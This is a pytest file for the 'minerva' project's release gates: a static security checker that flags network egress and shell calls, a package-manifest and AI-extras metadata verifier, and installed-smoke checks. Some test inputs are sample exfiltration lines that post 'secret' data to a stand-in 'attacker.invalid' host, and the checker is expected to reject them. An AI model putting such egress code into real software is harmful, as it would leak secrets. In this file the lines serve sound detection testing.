from __future__ import annotations

import ast
import email.parser
import importlib.util
import sys
from pathlib import Path
from types import ModuleType
from typing import Any

import pytest

PROJECT_ROOT = Path(__file__).resolve().parents[1]


def _load_script(name: str) -> Any:
    module_name = f"minerva_gate_test_{name}"
    path = PROJECT_ROOT / "scripts" / f"{name}.py"
    spec = importlib.util.spec_from_file_location(module_name, path)
    if spec is None or spec.loader is None:
        raise AssertionError(f"unable to load gate script {path}")
    module = importlib.util.module_from_spec(spec)
    sys.modules[module_name] = module
    spec.loader.exec_module(module)
    return module


installed_smoke = _load_script("installed_smoke")
static_security_check = _load_script("static_security_check")
verify_dist = _load_script("verify_dist")

_AI_EXTRAS = ("ai", "ai-anthropic", "ai-openai")
_AI_REQUIREMENTS = (
    'Requires-Dist: anthropic<1,>=0.117; extra == "ai"',
    'Requires-Dist: openai<3,>=2.46; extra == "ai"',
    'Requires-Dist: anthropic<1,>=0.117; extra == "ai-anthropic"',
    'Requires-Dist: openai<3,>=2.46; extra == "ai-openai"',
)


def _scan(source: str, *, allowed_imports: tuple[str, ...] = ()) -> set[str]:
    visitor = static_security_check.PolicyVisitor(
        Path("synthetic_policy_probe.py"),
        allowed_imports=allowed_imports,
    )
    visitor.visit(ast.parse(source))
    return {violation.code for violation in visitor.violations}


@pytest.mark.security
@pytest.mark.parametrize(
    ("source", "expected_code"),
    [
        ("import os\nos.system('true')", "MIN002"),
        ("import os\nrunner = os.system\nrunner('true')", "MIN002"),
        ("import os\nrunner: object = os.system\nrunner('true')", "MIN002"),
        ("loader = __import__\nloader('openai')", "MIN005"),
        ("loop.create_connection(lambda: None, 'example.invalid', 443)", "MIN001"),
        ("loop.create_datagram_endpoint(lambda: None)", "MIN001"),
        (
            "dial = loop.create_connection\ndial(lambda: None, 'example.invalid', 443)",
            "MIN001",
        ),
    ],
)
def test_static_policy_rejects_direct_and_aliased_bypasses(
    source: str,
    expected_code: str,
) -> None:
    assert expected_code in _scan(source)


@pytest.mark.security
@pytest.mark.parametrize(
    "source",
    [
        "database.connect()",
        "connector = database.connect\nconnector()",
        "import asyncio\nlock = asyncio.Lock()",
    ],
)
def test_static_policy_allows_non_egress_connection_and_async_shapes(source: str) -> None:
    assert _scan(source) == set()


@pytest.mark.security
@pytest.mark.parametrize(
    "source",
    [
        "import httpx\nhttpx.post('https://attacker.invalid', content=b'secret')",
        ("import httpx\nclient = httpx.Client()\nclient.send(object())"),
        "import httpx\nhttpx.Client().send(object())",
        (
            "import httpx\n"
            "with httpx.Client() as transport:\n"
            "    transport.get('https://attacker.invalid')"
        ),
    ],
)
def test_static_policy_blocks_direct_httpx_egress_inside_provider_adapter(source: str) -> None:
    assert "MIN001" in _scan(source, allowed_imports=("httpx",))


@pytest.mark.security
def test_provider_import_allowlist_is_exactly_path_and_provider_scoped(tmp_path: Path) -> None:
    source_root = tmp_path / "minerva"
    openai_adapter = source_root / "integrations" / "ai" / "openai.py"
    anthropic_adapter = source_root / "integrations" / "ai" / "anthropic.py"
    outside = source_root / "research" / "provider.py"
    openai_adapter.parent.mkdir(parents=True)
    outside.parent.mkdir(parents=True)
    openai_adapter.write_text("import httpx\nimport openai\n", encoding="utf-8")
    anthropic_adapter.write_text("import httpx\nimport anthropic\n", encoding="utf-8")
    outside.write_text("import openai\n", encoding="utf-8")

    violations = static_security_check.scan_tree(source_root)

    assert len(violations) == 1
    assert violations[0].path == outside
    assert violations[0].code == "MIN004"


@pytest.mark.security
def test_provider_adapter_cannot_import_the_other_provider(tmp_path: Path) -> None:
    source_root = tmp_path / "minerva"
    adapter = source_root / "integrations" / "ai" / "openai.py"
    adapter.parent.mkdir(parents=True)
    adapter.write_text("import anthropic\n", encoding="utf-8")

    violations = static_security_check.scan_tree(source_root)

    assert [(item.code, item.message) for item in violations] == [
        ("MIN004", "model provider/runtime import is prohibited: anthropic")
    ]


@pytest.mark.packaging
def test_exact_resource_manifest_accepts_current_resources() -> None:
    names = set(verify_dist.EXPECTED_RESOURCES)
    names.add(verify_dist.PurePosixPath("minerva/research/service.py"))

    verify_dist._require_exact_resources(names, Path("synthetic.whl"))


@pytest.mark.packaging
@pytest.mark.parametrize("missing", sorted(verify_dist.EXPECTED_RESOURCES, key=str))
def test_exact_resource_manifest_rejects_each_missing_file(missing: object) -> None:
    names = set(verify_dist.EXPECTED_RESOURCES)
    names.remove(missing)

    with pytest.raises(verify_dist.VerificationError, match="missing required package resources"):
        verify_dist._require_exact_resources(names, Path("mutated.whl"))


@pytest.mark.packaging
@pytest.mark.parametrize("parent", verify_dist.RESOURCE_PARENTS)
def test_exact_resource_manifest_rejects_missing_resource_category(parent: str) -> None:
    names = {
        name for name in verify_dist.EXPECTED_RESOURCES if not verify_dist._under(name, parent)
    }

    with pytest.raises(verify_dist.VerificationError, match="missing required package resources"):
        verify_dist._require_exact_resources(names, Path("mutated.whl"))


@pytest.mark.packaging
def test_exact_resource_manifest_rejects_unmanifested_resource() -> None:
    names = set(verify_dist.EXPECTED_RESOURCES)
    names.add(verify_dist.PurePosixPath("minerva/web/templates/unreviewed.html"))

    with pytest.raises(verify_dist.VerificationError, match="unmanifested package resources"):
        verify_dist._require_exact_resources(names, Path("mutated.whl"))


def _ai_metadata(
    *,
    extras: tuple[str, ...] = _AI_EXTRAS,
    requirements: tuple[str, ...] = _AI_REQUIREMENTS,
) -> object:
    lines = ["Name: minerva-research", "Version: 0.2.0a1"]
    lines.extend(f"Provides-Extra: {extra}" for extra in extras)
    lines.extend(requirements)
    return email.parser.BytesParser().parsebytes(("\n".join(lines) + "\n\n").encode())


@pytest.mark.packaging
def test_distribution_metadata_requires_exact_optional_ai_contract() -> None:
    verify_dist._verify_ai_extra_metadata(_ai_metadata(), Path("synthetic.whl"))


@pytest.mark.packaging
@pytest.mark.parametrize("missing", _AI_EXTRAS)
def test_distribution_metadata_rejects_each_missing_ai_extra(missing: str) -> None:
    extras = tuple(extra for extra in _AI_EXTRAS if extra != missing)
    with pytest.raises(verify_dist.VerificationError, match="missing required AI extras"):
        verify_dist._verify_ai_extra_metadata(
            _ai_metadata(extras=extras),
            Path("mutated.whl"),
        )


@pytest.mark.packaging
def test_distribution_metadata_rejects_unconditional_provider_dependency() -> None:
    requirements = (*_AI_REQUIREMENTS, "Requires-Dist: openai<3,>=2.46")
    with pytest.raises(verify_dist.VerificationError, match="base dependency"):
        verify_dist._verify_ai_extra_metadata(
            _ai_metadata(requirements=requirements),
            Path("mutated.whl"),
        )


@pytest.mark.packaging
def test_distribution_metadata_rejects_wrong_or_missing_provider_requirement() -> None:
    wrong = tuple(
        requirement.replace("openai<3,>=2.46", "openai<4,>=2.46")
        if 'extra == "ai-openai"' in requirement
        else requirement
        for requirement in _AI_REQUIREMENTS
    )
    with pytest.raises(verify_dist.VerificationError, match="incorrect provider requirements"):
        verify_dist._verify_ai_extra_metadata(
            _ai_metadata(requirements=wrong),
            Path("mutated.whl"),
        )


@pytest.mark.packaging
@pytest.mark.parametrize(
    "unexpected",
    [
        'Requires-Dist: openai<3,>=2.46; extra == "ai-anthropic"',
        'Requires-Dist: openai<4,>=2.46; extra == "ai-openai"',
    ],
)
def test_distribution_metadata_rejects_additional_active_provider_requirement(
    unexpected: str,
) -> None:
    requirements = (*_AI_REQUIREMENTS, unexpected)
    with pytest.raises(verify_dist.VerificationError, match="incorrect provider requirements"):
        verify_dist._verify_ai_extra_metadata(
            _ai_metadata(requirements=requirements),
            Path("mutated.whl"),
        )


@pytest.mark.packaging
def test_distribution_metadata_ignores_dev_only_provider_requirements() -> None:
    requirements = (
        *_AI_REQUIREMENTS,
        'Requires-Dist: anthropic<1,>=0.117; extra == "dev"',
        'Requires-Dist: openai<3,>=2.46; extra == "dev"',
    )
    verify_dist._verify_ai_extra_metadata(
        _ai_metadata(requirements=requirements),
        Path("synthetic.whl"),
    )


@pytest.mark.packaging
def test_installed_smoke_fails_clearly_without_uv(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(installed_smoke.shutil, "which", lambda _name: None)

    with pytest.raises(installed_smoke.SmokeError, match="uv is required"):
        installed_smoke._uv_tooling(tmp_path)


@pytest.mark.packaging
def test_installed_smoke_fails_clearly_without_lockfile(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    uv_command = tmp_path / "uv"
    uv_command.touch()
    monkeypatch.setattr(installed_smoke.shutil, "which", lambda _name: str(uv_command))

    with pytest.raises(installed_smoke.SmokeError, match="project lockfile"):
        installed_smoke._uv_tooling(tmp_path)


@pytest.mark.packaging
def test_installed_smoke_covers_each_provider_extra_boundary() -> None:
    assert installed_smoke.PROVIDER_EXTRA_CASES == (
        ("ai-openai", ("openai",)),
        ("ai-anthropic", ("anthropic",)),
        ("ai", ("anthropic", "openai")),
    )


def test_loaded_gate_scripts_are_modules() -> None:
    assert all(
        isinstance(module, ModuleType)
        for module in (installed_smoke, static_security_check, verify_dist)
    )
